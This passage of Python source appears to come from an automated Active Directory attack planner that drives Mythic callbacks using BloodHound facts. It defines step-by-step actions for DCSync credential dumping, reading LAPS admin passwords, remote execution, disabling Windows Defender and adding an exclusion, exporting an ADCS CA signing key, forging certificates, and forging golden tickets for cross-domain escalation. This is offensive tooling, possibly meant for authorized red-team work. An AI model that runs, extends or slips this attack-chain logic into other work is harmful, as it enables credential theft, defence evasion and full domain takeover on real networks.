    context_callback_id: str = "",
    source_fact: str = "",
) -> CapabilityAction:
    domain = _normalize(domain)
    account = _normalize(account)
    context_effect = _kerberos_context_effect(domain, context_callback_id) if context_callback_id else ""
    preconditions = [
        f"ds-replication-rights:{domain}",
        "live-foothold:*",
    ]
    source_facts = [source_fact or f"credential-target:{account}@{domain}", f"ds-replication-rights:{domain}"]
    if context_effect:
        preconditions.append(context_effect)
        source_facts.append(context_effect)
    return CapabilityAction(
        name="dcsync-account",
        target=f"domain={domain};account={account}",
        preconditions=preconditions,
        effects=[f"creds:{account}@{domain}"],
        intent={
            "capability": "dcsync-account",
            "domain": domain,
            "account": account,
            "steps": [
                "select a reachable domain controller for the account domain",
                "perform a replication request for the specific objective-relevant account",
                "extract real NTLM/AES/RC4 material from the output",
                "record success only when non-placeholder secret material is present",
            ],
        },
        verifier={
            "achieved_any": ["user_hash_present", "credentials_dumped"],
            "partial_any": ["secretsdump_connected", "dcsync_started", "domain_hashes_dumped"],
            "blockers": [
                "replication_access_denied",
                "access_denied",
                "bad_dn",
                "principal_not_found",
                "target_not_found",
                "dc_unreachable",
            ],
        },
        reason="objective/graph selected this account as credential material worth extracting; verify a real secret",
        source_facts=[fact for fact in source_facts if fact],
    )


def _ensure_account_kerberos_context_action(domain: str, account: str, callback_id: str) -> CapabilityAction:
    domain = _normalize(domain)
    account = _normalize(account)
    callback_id = _normalize_callback_id(callback_id)
    effect = _kerberos_account_context_effect(domain, account, callback_id)
    return CapabilityAction(
        name="ensure-account-kerberos-context",
        target=f"domain={domain};account={account};callback={callback_id}",
        preconditions=[f"creds:{account}@{domain}", f"live-callback:{callback_id}"],
        effects=[effect],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": domain,
            "account": account,
            "callback_id": callback_id,
            "steps": [
                "probe the callback's current Kerberos ticket store for this account first",
                "reuse stored account key material to request a TGT only if the current context lacks it",
                "create or reuse an isolated logon context on the same callback",
                "import the account TGT into that context without pass-the-ticket flags",
                "record success only when the expected account ticket and service access are both proven",
            ],
        },
        verifier={
            "achieved_all": [
                "logon_context_proven",
                "account_ticket_present",
                "service_access_proven",
                "callback_id",
            ],
            "partial_any": ["tgt_present", "ticket_imported", "ticket_context_created"],
            "blockers": [
                "bad_key",
                "clock_skew",
                "ticket_injection_failed",
                "logon_context_failed",
                "kdc_rejected",
                "access_denied",
                "callback_dead",
            ],
        },
        reason="verified account secret can create a callback-scoped Kerberos context for follow-on access",
        source_facts=[f"creds:{account}@{domain}", f"live-callback:{callback_id}"],
    )


def _read_managed_local_admin_secret_action(
    account_domain: str,
    account: str,
    target_domain: str,
    target_host: str,
    callback_id: str,
    source_fact: str = "",
) -> CapabilityAction:
    account_domain = _normalize(account_domain)
    account = _normalize(account)
    target_domain = _normalize(target_domain)
    target_host = _normalize(_host_short(target_host))
    callback_id = _normalize_callback_id(callback_id)
    context_effect = _kerberos_account_context_effect(account_domain, account, callback_id)
    effect = _managed_local_admin_secret_effect(target_host, target_domain)
    source = source_fact or (
        f"can-read-managed-local-admin-secret:account={account};account_domain={account_domain};"
        f"target={target_host};target_domain={target_domain}"
    )
    return CapabilityAction(
        name="read-managed-local-admin-secret",
        target=(
            f"account={account};account_domain={account_domain};"
            f"target={target_host};target_domain={target_domain};callback={callback_id}"
        ),
        preconditions=[context_effect, source],
        effects=[effect],
        intent={
            "capability": "read-managed-local-admin-secret",
            "account": account,
            "account_domain": account_domain,
            "target_host": target_host,
            "target_domain": target_domain,
            "callback_id": callback_id,
            "steps": [
                "reuse the callback-scoped Kerberos account context; do not create another logon session",
                "query the target computer object over LDAP for managed local admin password attributes",
                "record success only when plaintext managed local admin secret material is disclosed",
            ],
        },
        verifier={
            "achieved_any": [
                "managed_local_admin_secret_present",
                "legacy_laps_password_present",
                "windows_laps_password_present",
            ],
            "required": ["callback_id", "target_host", "target_domain"],
            "partial_any": [
                "computer_object_found",
                "laps_metadata_present",
                "encrypted_laps_blob_present",
                "directory_query_succeeded",
            ],
            "blockers": [
                "access_denied",
                "ldap_bind_failed",
                "directory_unreachable",
                "target_not_found",
                "wrong_kerberos_context",
            ],
        },
        reason="verified account context can read managed local admin password material on this computer",
        source_facts=[context_effect, source],
    )


def _use_managed_local_admin_secret_action(
    target_domain: str,
    target_host: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    target_host = _normalize(_host_short(target_host))
    callback_id = _normalize_callback_id(callback_id)
    secret_effect = _managed_local_admin_secret_effect(target_host, target_domain)
    effects = [
        _local_admin_effect(target_host, target_domain),
        f"admin:{target_host}",
        f"system-or-admin:{target_host}",
    ]
    return CapabilityAction(
        name="use-managed-local-admin-secret",
        target=f"target={target_host};target_domain={target_domain};callback={callback_id}",
        preconditions=[secret_effect, f"live-callback:{callback_id}"],
        effects=effects,
        intent={
            "capability": "use-managed-local-admin-secret",
            "target_host": target_host,
            "target_domain": target_domain,
            "callback_id": callback_id,
            "local_account": "Administrator",
            "steps": [
                "select the recovered managed local admin plaintext from the operation credential source",
                "create an isolated NetOnly logon context on the callback; do not overwrite current context",
                "prove remote local admin access with an admin-share/service operation from that context",
                "record success only when the target service access is proven",
            ],
        },
        verifier={
            "achieved_any": ["local_admin_access_proven", "admin_share_access_proven", "service_access_proven"],
            "required": ["callback_id", "target_host", "target_domain"],
            "partial_any": ["logon_context_created", "credential_accepted"],
            "blockers": [
                "access_denied",
                "logon_failure",
                "bad_password",
                "network_path_not_found",
                "host_unreachable",
                "callback_dead",
            ],
        },
        reason="verified managed local admin secret can establish target-local admin access when service proof succeeds",
        source_facts=[secret_effect, f"live-callback:{callback_id}"],
    )


def _execute_as_local_admin_action(
    target_domain: str,
    target_host: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    target_host = _normalize(_host_short(target_host))
    callback_id = _normalize_callback_id(callback_id)
    local_admin_effect = _local_admin_effect(target_host, target_domain)
    effects = [
        _remote_exec_effect(target_host, target_domain),
        f"host-exec:{target_host}",
    ]
    return CapabilityAction(
        name="execute-as-local-admin",
        target=f"target={target_host};target_domain={target_domain};callback={callback_id}",
        preconditions=[local_admin_effect, f"live-callback:{callback_id}"],
        effects=effects,
        intent={
            "capability": "execute-as-local-admin",
            "target_host": target_host,
            "target_domain": target_domain,
            "callback_id": callback_id,
            "local_account": "Administrator",
            "steps": [
                "select the existing verified local-admin credential or context; do not create a domain ticket",
                "execute a bounded proof command on the target host through a remote-management primitive",
                "read the target-side proof file over an admin/service channel",
                "record success only when the proof file contains the expected marker and target identity",
            ],
        },
        verifier={
            "achieved_any": ["remote_execution_proven", "remote_command_output_proven", "proof_file_read"],
            "required": ["callback_id", "target_host", "target_domain"],
            "partial_any": ["remote_process_created", "proof_file_present", "credential_accepted"],
            "blockers": [
                "access_denied",
                "logon_failure",
                "bad_password",
                "wmi_unavailable",
                "rpc_unavailable",
                "network_path_not_found",
                "proof_not_found",
                "execution_failed",
                "callback_dead",
            ],
        },
        reason="verified target-local admin access can run a bounded remote command; prove execution before chaining",
        source_facts=[local_admin_effect, f"live-callback:{callback_id}"],
    )


def _endpoint_protection_adjustment_action(
    target_domain: str,
    target_host: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    target_host = _normalize(_host_short(target_host))
    callback_id = _normalize_callback_id(callback_id)
    remote_exec_effect = _remote_exec_effect(target_host, target_domain)
    local_admin_effect = _local_admin_effect(target_host, target_domain)
    effect = _endpoint_protection_adjusted_effect(target_host, target_domain)
    return CapabilityAction(
        name="endpoint-protection-adjustment",
        target=f"target={target_host};target_domain={target_domain};callback={callback_id}",
        preconditions=[remote_exec_effect, local_admin_effect, f"live-callback:{callback_id}"],
        effects=[effect],
        intent={
            "capability": "endpoint-protection-adjustment",
            "target_host": target_host,
            "target_domain": target_domain,
            "callback_id": callback_id,
            "provider": "windows-defender",
            "local_account": "Administrator",
            "actions": ["disable_realtime", "add_exclusion"],
            "exclusion_paths": [r"C:\Windows\Temp"],
            "steps": [
                "read endpoint protection status before changing it",
                "apply only the requested bounded adjustment using an admin context",
                "read endpoint protection status after the change",
                "record success only when real-time protection is off, inactive, or the requested exclusion is present",
            ],
        },
        verifier={
            "achieved_any": [
                "endpoint_adjustment_proven",
                "realtime_disabled_after",
                "requested_exclusion_present",
                "endpoint_inactive",
            ],
            "required": ["callback_id", "target_host", "target_domain"],
            "partial_any": ["endpoint_status_read", "remote_process_created"],
            "blockers": [
                "tamper_protected",
                "set_preference_failed",
                "access_denied",
                "not_admin",
                "cmdlet_missing",
                "logon_failure",
                "network_path_not_found",
                "output_not_found",
                "wmi_unavailable",
                "rpc_unavailable",
                "callback_dead",
            ],
        },
        reason="prior endpoint-control blocker observed on this host; verify and adjust before retrying killed tooling",
        source_facts=[remote_exec_effect, local_admin_effect, f"defender-blocked:{target_host}@{target_domain}"],
    )


def _adcs_ca_private_key_export_action(
    target_domain: str,
    target_host: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    target_host = canonical_host_for_domain(target_host, target_domain)
    callback_id = _normalize_callback_id(callback_id)
    remote_exec_effect = _remote_exec_effect(target_host, target_domain)
    local_admin_effect = _local_admin_effect(target_host, target_domain)
    effects = [
        _adcs_ca_private_key_effect(target_host, target_domain),
        f"adcs-ca:{target_host}@{target_domain}",
    ]
    return CapabilityAction(
        name="adcs-ca-private-key-export",
        target=f"target={target_host};target_domain={target_domain};callback={callback_id}",
        preconditions=[remote_exec_effect, local_admin_effect, f"live-callback:{callback_id}"],
        effects=effects,
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": target_host,
            "target_domain": target_domain,
            "callback_id": callback_id,
            "local_account": "Administrator",
            "steps": [
                "reuse proven remote execution/local-admin access on the candidate CA host",
                "identify a LocalMachine CA certificate with an accessible private key",
                "prefer a native CA backup/private-key export path before any uploaded tooling fallback",
                "record success only when PFX private-key material and CA metadata are both verified",
            ],
        },
        verifier={
            "achieved_all": [
                "ca_private_key_material_present",
                "ca_certificate_identified",
                "ca_export_completed",
            ],
            "required": ["callback_id", "target_host", "target_domain"],
            "partial_any": ["ca_certificate_identified", "remote_process_created", "metadata_file_present"],
            "blockers": [
                "no_ca_certificate",
                "key_not_exportable",
                "pfx_export_failed",
                "access_denied",
                "logon_failure",
                "network_path_not_found",
                "output_not_found",
                "wmi_unavailable",
                "rpc_unavailable",
                "callback_dead",
            ],
        },
        reason="verified remote execution/local-admin access can export CA signing material; prove artifact before chaining",
        source_facts=[remote_exec_effect, local_admin_effect, f"live-callback:{callback_id}"],
    )


def _adcs_esc_certificate_enroll_action(
    target_domain: str,
    ca_host: str,
    account: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    ca_host = canonical_host_for_domain(ca_host, target_domain)
    account = _normalize(account) or "administrator"
    callback_id = _normalize_callback_id(callback_id)
    effect = _adcs_enrolled_certificate_effect(account, target_domain)
    blocked_fact = f"adcs-ca-key-export-blocked:{ca_host}@{target_domain}"
    return CapabilityAction(
        name="adcs-esc-certificate-enroll",
        target=f"domain={target_domain};account={account};ca_host={ca_host};callback={callback_id}",
        preconditions=[blocked_fact, f"live-callback:{callback_id}"],
        effects=[effect],
        intent={
            "capability": "adcs-esc-certificate-enroll",
            "domain": target_domain,
            "account": account,
            "ca_host": ca_host,
            "callback_id": callback_id,
            "certificate_already_forged": True,
            "steps": [
                "do not upload or remotely execute DPAPI tooling on the CA host",
                "use an observed/vulnerable ADCS template and CA name supplied by graph or runtime inputs",
                "request an account certificate with native enrollment from the current valid domain context",
                "export the account certificate PFX to the deterministic certificate-auth path",
                "record success only when certificate and private-key material are both verified",
            ],
        },
        verifier={
            "achieved_all": [
                "enrolled_certificate_material_present",
                "enrolled_certificate_private_key_present",
                "certificate_enrollment_completed",
            ],
            "required": ["callback_id", "account", "domain"],
            "partial_any": ["certificate_request_submitted", "template_found", "ca_reachable"],
            "blockers": [
                "certificate_request_denied",
                "template_not_found",
                "ca_unreachable",
                "enrollment_context_missing",
                "tool_execution_failed",
                "access_denied",
                "logon_failure",
                "callback_dead",
            ],
        },
        reason="CA signing-key extraction is blocked; request a vulnerable-template account certificate instead",
        source_facts=[blocked_fact, f"live-callback:{callback_id}"],
    )


def _adcs_certificate_auth_action(
    target_domain: str,
    ca_host: str,
    account: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    ca_host = canonical_host_for_domain(ca_host, target_domain)
    account = _normalize(account) or "administrator"
    callback_id = _normalize_callback_id(callback_id)
    ca_key_effect = _adcs_ca_private_key_effect(ca_host, target_domain)
    certificate_effect = f"certificate-auth:{account}@{target_domain}"
    return CapabilityAction(
        name="adcs-certificate-auth",
        target=f"domain={target_domain};account={account};ca_host={ca_host};callback={callback_id}",
        preconditions=[ca_key_effect, f"live-callback:{callback_id}"],
        effects=[f"da:{target_domain}", certificate_effect],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": target_domain,
            "account": account,
            "ca_host": ca_host,
            "callback_id": callback_id,
            "steps": [
                "select or stage the verified CA signing PFX artifact; do not re-extract the CA key",
                "forge a certificate for the objective-relevant account offline",
                "request a PKINIT TGT artifact with the forged certificate without pass-the-ticket flags",
                "create or reuse an isolated logon context on the callback",
                "import the PKINIT TGT into that context and prove target-domain service access",
                "record success only when certificate-auth service access is proven on this callback",
            ],
        },
        verifier={
            "achieved_any": ["certificate_auth_proven", "schannel_ldap_bind", "ntlm_hash_present"],
            "required": ["callback_id", "account", "domain"],
            "partial_any": [
                "certificate_forged",
                "forged_certificate_present",
                "pkinit_tgt_present",
                "ticket_imported",
                "ticket_context_created",
            ],
            "blockers": [
                "ca_pfx_missing",
                "certificate_forge_failed",
                "forged_certificate_missing",
                "pkinit_failed",
                "kdc_rejected",
                "bad_certificate",
                "ticket_injection_failed",
                "logon_context_failed",
                "access_denied",
                "callback_dead",
            ],
        },
        reason=(
            "verified ADCS CA signing material can authenticate as a target account; "
            "prove DA-level service access from an isolated Kerberos context"
        ),
        source_facts=[ca_key_effect, f"live-callback:{callback_id}"],
    )


def _ensure_kerberos_context_action(source_domain: str, target_domain: str, callback_id: str) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    source_domain = _normalize(source_domain) or target_domain
    callback_id = _normalize_callback_id(callback_id)
    target = f"domain={target_domain};callback={callback_id}"
    if source_domain != target_domain:
        target += f";source_domain={source_domain}"
    effect = _kerberos_context_effect(target_domain, callback_id)
    return CapabilityAction(
        name="ensure-kerberos-context",
        target=target,
        preconditions=[
            f"da:{target_domain}",
            f"krbtgt-hash:{source_domain}",
            f"live-callback:{callback_id}",
        ],
        effects=[effect],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": target_domain,
            "target_domain": target_domain,
            "source_domain": source_domain,
            "callback_id": callback_id,
            "user": "Administrator",
            **({"requires_extra_sids": True} if source_domain != target_domain else {}),
            "steps": [
                "probe the callback's current Kerberos context for target-domain service access first",
                "reuse Mythic/BloodHound credential facts to build a ticket only if the current context lacks access",
                "create or reuse an isolated logon context on the same callback",
                "import the ticket into that context without pass-the-ticket flags",
                "record success only when service access is proven on this callback",
            ],
        },
        verifier={
            "achieved_any": ["ticket_valid", "domain_admin", "service_access_proven"],
            "required": ["callback_id"],
            "partial_any": ["ticket_forged", "tgt_present", "ticket_imported", "ticket_context_created"],
            "blockers": [
                "bad_krbtgt_key",
                "bad_domain_sid",
                "clock_skew",
                "ticket_injection_failed",
                "logon_context_failed",
                "kdc_rejected",
                "access_denied",
                "callback_dead",
            ],
        },
        reason=(
            "durable DA/EA exists, but no live callback-scoped Kerberos context is proven; "
            "reuse stored ticket facts and prove this callback before DCSync"
        ),
        source_facts=[f"da:{target_domain}", f"krbtgt-hash:{source_domain}", f"live-callback:{callback_id}"],
    )


def _refresh_kerberos_context_action(
    domain: str,
    callback_id: str,
    authorization_effect: str = "",
) -> CapabilityAction:
    domain = _normalize(domain)
    callback_id = _normalize_callback_id(callback_id)
    authorization_effect = _canonical_effect(authorization_effect) or f"da:{domain}"
    effect = _kerberos_context_effect(domain, callback_id)
    return CapabilityAction(
        name="ensure-kerberos-context",
        target=f"domain={domain};callback={callback_id}",
        preconditions=[
            authorization_effect,
            f"live-callback:{callback_id}",
        ],
        effects=[effect],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": domain,
            "target_domain": domain,
            "callback_id": callback_id,
            "refresh_current_context": True,
            "steps": [
                "probe the callback's current Kerberos context first",
                "if the proof fails, purge stale tickets from the current logon session",
                "touch a target-domain service to force a fresh TGT/TGS with current group membership",
                "record success only when service access is proven on this callback",
            ],
        },
        verifier={
            "achieved_any": ["ticket_valid", "domain_admin", "service_access_proven"],
            "required": ["callback_id"],
            "partial_any": ["tgt_present"],
            "blockers": [
                "clock_skew",
                "access_denied",
                "callback_dead",
            ],
        },
        reason=(
            "durable DA/EA membership exists on this callback's domain, but the current Kerberos PAC may "
            "be stale; refresh tickets in-place and prove service access before DCSync"
        ),
        source_facts=[authorization_effect, f"live-callback:{callback_id}"],
    )


def _adcs_certificate_auth_from_enrolled_certificate_action(
    target_domain: str,
    account: str,
    callback_id: str,
) -> CapabilityAction:
    target_domain = _normalize(target_domain)
    account = _normalize(account) or "administrator"
    callback_id = _normalize_callback_id(callback_id)
    cert_effect = _adcs_enrolled_certificate_effect(account, target_domain)
    certificate_effect = f"certificate-auth:{account}@{target_domain}"
    return CapabilityAction(
        name="adcs-certificate-auth",
        target=f"domain={target_domain};account={account};callback={callback_id}",
        preconditions=[cert_effect, f"live-callback:{callback_id}"],
        effects=[f"da:{target_domain}", certificate_effect],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": target_domain,
            "account": account,
            "callback_id": callback_id,
            "certificate_already_forged": True,
            "skip_certificate_forge": True,
            "pre_forged_certificate": True,
            "steps": [
                "reuse the enrolled account certificate PFX from the prior ADCS enrollment capability",
                "request a PKINIT TGT artifact with the certificate without pass-the-ticket flags",
                "create or reuse an isolated logon context on the callback",
                "import the PKINIT TGT into that context and prove target-domain service access",
                "record success only when certificate-auth service access is proven on this callback",
            ],
        },
        verifier={
            "achieved_any": ["certificate_auth_proven", "schannel_ldap_bind", "ntlm_hash_present"],
            "required": ["callback_id", "account", "domain"],
            "partial_any": [
                "pkinit_tgt_present",
                "tgt_present",
                "ticket_imported",
                "ticket_context_created",
            ],
            "blockers": [
                "forged_certificate_missing",
                "pkinit_not_supported",
                "pkinit_failed",
                "kdc_rejected",
                "bad_certificate",
                "ticket_injection_failed",
                "logon_context_failed",
                "access_denied",
                "callback_dead",
            ],
        },
        reason="verified enrolled account certificate can authenticate; prove target-domain access before recording",
        source_facts=[cert_effect, f"live-callback:{callback_id}"],
    )


def _forge_golden_ticket_action(domain: str, target_domain: str = "") -> CapabilityAction:
    target_domain = _normalize(target_domain)
    effect_domain = target_domain or domain
    target = f"domain={domain}"
    if target_domain:
        target += f";target_domain={target_domain}"
    steps = [
        "resolve the domain SID from BloodHound or live directory queries",
        "select verified krbtgt key material from the credential store",
        "optionally include ExtraSIDs only when the graph/objective identifies a parent-domain target",
        "forge a ticket artifact without passing it into the current process",
        "create an isolated Kerberos logon context and import the ticket there",
        "record success only when the ticket is proven usable",
    ]
    reason = "verified krbtgt material can forge a reusable ticket; prove access from an isolated Kerberos context"
    if target_domain:
        steps[2] = "include the parent-domain Enterprise Admins SID as ExtraSIDs"
        reason = "verified child krbtgt material can forge an ExtraSIDs ticket for the parent domain; prove access from an isolated Kerberos context"
    return CapabilityAction(
        name="forge-golden-ticket",
        target=target,
        preconditions=[f"krbtgt-hash:{domain}"],
        effects=[f"da:{effect_domain}"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": domain,
            **({"target_domain": target_domain, "requires_extra_sids": True} if target_domain else {}),
            "user": "Administrator",
            "steps": steps,
        },
        verifier={
            "achieved_any": ["ticket_valid", "domain_admin"],
            "partial_any": ["ticket_forged", "tgt_present", "ticket_imported", "ticket_context_created"],
            "blockers": [
                "bad_krbtgt_key",
                "bad_domain_sid",
                "clock_skew",
                "ticket_injection_failed",
                "logon_context_failed",
                "kdc_rejected",
                "access_denied",
            ],
        },
        reason=reason,
        source_facts=[f"krbtgt-hash:{domain}"],
    )


def _controlled_gpos_with_domain(facts: set[str]) -> list[tuple[str, str]]:
    controlled = {
        fact.rsplit(":", 1)[1]
        for fact in facts
        if fact.startswith(_GPO_CONTROL_PREFIXES)
    }
    out: set[tuple[str, str]] = set()
    for fact in facts:
        if not fact.startswith("gpo-domain:"):
            continue
        tail = fact[len("gpo-domain:"):]
        gpo, _, domain = tail.partition(":")
        gpo = _normalize(gpo)
        domain = _normalize(domain)
        if gpo and domain and gpo in controlled:
            out.add((gpo, domain))
    return sorted(out)


def _gpo_guid_map(facts: set[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    prefix = "gpo-guid:"
    for fact in facts:
        if not fact.startswith(prefix):
            continue
        tail = fact[len(prefix):]
        gpo, sep, guid = tail.partition(":")
        gpo = _normalize(gpo)
        guid = _normalize_guid(guid)
        if sep and gpo and guid:
            out[gpo] = guid
    return out


def _gpo_dc_scope_map(facts: set[str]) -> dict[tuple[str, str], list[str]]:
    out: dict[tuple[str, str], set[str]] = {}
    prefix = "gpo-affects-dc:"
    for fact in facts:
        if not fact.startswith(prefix):
            continue
        tail = fact[len(prefix):]
        parts = tail.split(":")
        if len(parts) < 3:
            continue
        gpo = _normalize(parts[0])
        host = _normalize(parts[1])
        domain = _normalize(":".join(parts[2:]))
        if not gpo or not host or not domain:
            continue
        out.setdefault((gpo, domain), set()).add(host)
    return {key: sorted(value) for key, value in out.items()}


def _gpo_scope_map(facts: set[str]) -> dict[tuple[str, str], list[str]]:
    out: dict[tuple[str, str], set[str]] = {}
    prefix = "gpo-affects-computer:"
    for fact in facts:
        if not fact.startswith(prefix):
            continue
        tail = fact[len(prefix):]
        parts = tail.split(":")
        if len(parts) < 3:
            continue
        gpo = _normalize(parts[0])
        host = _normalize(parts[1])
        domain = _normalize(":".join(parts[2:]))
        if not gpo or not host or not domain:
            continue
        out.setdefault((gpo, domain), set()).add(host)
    return {key: sorted(value) for key, value in out.items()}


def _normalize_guid(value: Any) -> str:
    text = _text(value).strip().strip("{}")
    if _GUID_RE.fullmatch(text):
        return text.casefold()
    return ""


def _braced_guid(value: Any) -> str:
    guid = _normalize_guid(value)
    if not guid:
        return ""
    return "{" + guid.upper() + "}"


def _system_exec_gpos(achieved: set[str]) -> list[tuple[str, str]]:
    out: set[tuple[str, str]] = set()
    prefix = "system-exec:gpo:"
    for effect in achieved:
        if not effect.startswith(prefix):
            continue
        tail = effect[len(prefix):]
        gpo, sep, domain = tail.partition("@")
        gpo = _normalize(gpo)
        domain = _normalize(domain)
        if sep and gpo and domain:
            out.add((gpo, domain))
    return sorted(out)


def _replication_right_domains(predicates: set[str]) -> list[str]:
    domains = {
        predicate[len("ds-replication-rights:"):].strip()
        for predicate in predicates
        if predicate.startswith("ds-replication-rights:")
    }
    return sorted(domain for domain in domains if domain)


def _krbtgt_hash_domains(predicates: set[str]) -> list[str]:
    domains = {
        predicate[len("krbtgt-hash:"):].strip()
        for predicate in predicates
        if predicate.startswith("krbtgt-hash:")
    }
    return sorted(domain for domain in domains if domain)


def _credential_material_accounts(predicates: set[str]) -> list[tuple[str, str]]:
    accounts: set[tuple[str, str]] = set()
    for predicate in predicates:
        if predicate.startswith("creds:"):
            account, domain = _account_domain_from_target(predicate[len("creds:"):])
        elif predicate.startswith("certificate-auth:"):
            account, domain = _account_domain_from_target(predicate[len("certificate-auth:"):])
        else:
            continue
        if _dcsync_account_target_allowed(account, domain, set()):
            accounts.add((domain, account))
    return sorted(accounts)


def _credential_material_is_admin_context_source(achieved: set[str], domain: str, account: str) -> bool:
    domain = _normalize(domain)
    account = _normalize(account)
    if not domain or not account:
        return False
    return (
        f"da:{domain}" in achieved
        and (
            f"certificate-auth:{account}@{domain}" in achieved
            or account in {"administrator", "admin"}
        )
    )


def _credential_material_context_unblocks_progress(achieved: set[str], domain: str, account: str) -> bool:
    """Return whether materializing an account TGT is a modeled step forward without downstream edges.

    Broad BloodHound credential-target facts can mark many principals as harvestable. Once a domain is already
    admin-controlled, krbtgt-backed, or has a domain Kerberos context, arbitrary account contexts become side
    quests unless a downstream account-scoped edge asks for a specific account.
    """
    domain = _normalize(domain)
    account = _normalize(account)
    if not domain or not account:
        return False
    if _credential_material_is_admin_context_source(achieved, domain, account):
        return not _domain_admin_context_material_available(achieved, domain)
    if _domain_control_material_available(achieved, domain):
        return False
    return True


def _domain_control_material_available(achieved: set[str], domain: str) -> bool:
    domain = _normalize(domain)
    if not domain:
        return False
    return (
        f"da:{domain}" in achieved
        or f"ea:{domain}" in achieved
        or _domain_admin_context_material_available(achieved, domain)
    )


def _domain_admin_context_material_available(achieved: set[str], domain: str) -> bool:
    domain = _normalize(domain)
    if not domain:
        return False
    if f"krbtgt-hash:{domain}" in achieved:
        return True
    for effect in achieved:
        parsed = _parse_kerberos_context_effect(effect)
        if parsed and parsed[0] == domain:
            return True
    return False


def _non_admin_credential_material_domains(achieved: set[str]) -> set[str]:
    domains: set[str] = set()
    for domain, account in _credential_material_accounts(achieved):
        if not _credential_material_is_admin_context_source(achieved, domain, account):
            domains.add(domain)
    return domains


_CREDENTIAL_TARGET_PREFIXES = (
    "credential-target:",
    "dcsync-account-target:",
    "target-account:",
    "target-principal:",
    "valuable-principal:",
)


def _credential_target_accounts(
    facts: set[str],
    achieved: set[str],
    objective: Any = "",
    downstream_targets: set[tuple[str, str]] | None = None,
    restrict_to_explicit: bool = False,
) -> list[tuple[str, str, str]]:
    """Return objective-relevant non-krbtgt accounts whose credential material should be extracted.

    The source can be a graph/objective fact such as ``credential-target:alice@lab.local`` or a structured
    fact tail like ``credential-target:domain=lab.local;account=alice``. This keeps range-specific names out
    of Sage while giving BloodHound/objective analysis a deterministic hook into account DCSync. When the
    objective target scope is visible but still uncollected, callers can suppress generic harvestable
    principals while preserving accounts explicitly selected by the objective or a downstream route.
    """
    targets: dict[tuple[str, str], str] = {}
    explicit_objective_targets: set[tuple[str, str]] = set()
    for fact in sorted(facts):
        for prefix in _CREDENTIAL_TARGET_PREFIXES:
            if not fact.startswith(prefix):
                continue
            account, domain = _account_domain_from_target(fact[len(prefix):])
            if _dcsync_account_target_allowed(account, domain, achieved):
                targets.setdefault((domain, account), fact)
            break

    downstream_targets = (
        set(downstream_targets)
        if downstream_targets is not None
        else _credential_accounts_required_by_downstream(facts, objective)
    )
    for domain, account in sorted(downstream_targets):
        if _dcsync_account_target_allowed(account, domain, achieved):
            targets.setdefault((domain, account), f"downstream-account-target:{account}@{domain}")

    for match in re.finditer(
        r"\b(?:creds|credential-target|dcsync-account-target|target-account):"
        r"([a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\b",
        _text(objective),
        re.IGNORECASE,
    ):
        account, domain = _account_domain_from_target(match.group(1))
        if _dcsync_account_target_allowed(account, domain, achieved):
            explicit_objective_targets.add((domain, account))
            targets.setdefault((domain, account), f"objective:{match.group(0)}")
    try:
        try:
            from . import engagement_state as _es
        except ImportError:
            import engagement_state as _es
        natural_targets = _es._objective_credential_targets(objective)
    except Exception:
        natural_targets = set()
    for account, domain in sorted(natural_targets):
        if _dcsync_account_target_allowed(account, domain, achieved):
            explicit_objective_targets.add((domain, account))
            targets.setdefault((domain, account), f"objective:credential-material-for:{account}@{domain}")
    if downstream_targets:
        targets = {
            key: source
            for key, source in targets.items()
            if key in downstream_targets or key in explicit_objective_targets
        }
    elif restrict_to_explicit:
        targets = {
            key: source
            for key, source in targets.items()
            if key in explicit_objective_targets
        }
    else:
        satisfied_domains = _non_admin_credential_material_domains(achieved)
        if satisfied_domains:
            targets = {
                key: source
                for key, source in targets.items()
                if key[0] not in satisfied_domains
            }
    return [(domain, account, source) for (domain, account), source in sorted(targets.items())]


def _objective_target_trusted_scope_pending(state: Any) -> bool:
    """Whether the objective names a trusted domain that still needs scoped collection.

    The controller already uses engagement-state's trust/collection helpers to decide when a targeted
    collection is justified. Reuse that same read-only signal here so broad harvestable account facts do not
    keep the frontier non-empty before the route-defining target scope has been collected.
    """
    try:
        try:
            from . import engagement_state as _es
        except ImportError:
            import engagement_state as _es
        objective_targets = list(_es._objective_target_domains(getattr(state, "objective", "") or ""))
        if not objective_targets:
            return False
        return any(
            any(_es._domains_equivalent(domain, target) for target in objective_targets)
            for domain in _es.trusted_uncollected_domains(state)
        )
    except Exception:
        return False


def _credential_accounts_required_by_downstream(
    facts: set[str],
    objective: Any = "",
    achieved: set[str] | None = None,
    terminal_failed: set[str] | None = None,
) -> set[tuple[str, str]]:
    """Accounts that are not merely harvestable, but required by a downstream account-scoped edge.

    This is the generic satisficing rule for graph-selected identities: if the graph says a specific
    account can perform the next account-scoped action, DCSync/context work should converge on that
    account instead of draining every sibling principal that happened to be reachable. When multiple
    accounts lead to the same downstream effect, expose one route at a time: prefer an already-usable
    context, then existing credentials, then an operator/objective-selected route, then a stable fallback.
    """
    achieved = set(achieved or set())
    terminal_failed = set(terminal_failed or set())
    routes: dict[str, set[tuple[str, str]]] = {}
    objective_routes: set[tuple[str, str, str]] = set()

    def add_from_fact(text: str, *, objective_selected: bool = False) -> None:
        for prefix in _MANAGED_SECRET_READ_PREFIXES:
            if not text.startswith(prefix):
                continue
            parsed = _managed_secret_target_from_tail(text[len(prefix):])
            if not parsed:
                break
            account_domain, account, _target_domain, _target_host = parsed
            account_domain = _normalize(account_domain)
            account = _normalize(account)
            if account and account_domain:
                effect = _managed_local_admin_secret_effect(_target_host, _target_domain)
                routes.setdefault(effect, set()).add((account_domain, account))
                if objective_selected:
                    objective_routes.add((effect, account_domain, account))
            break

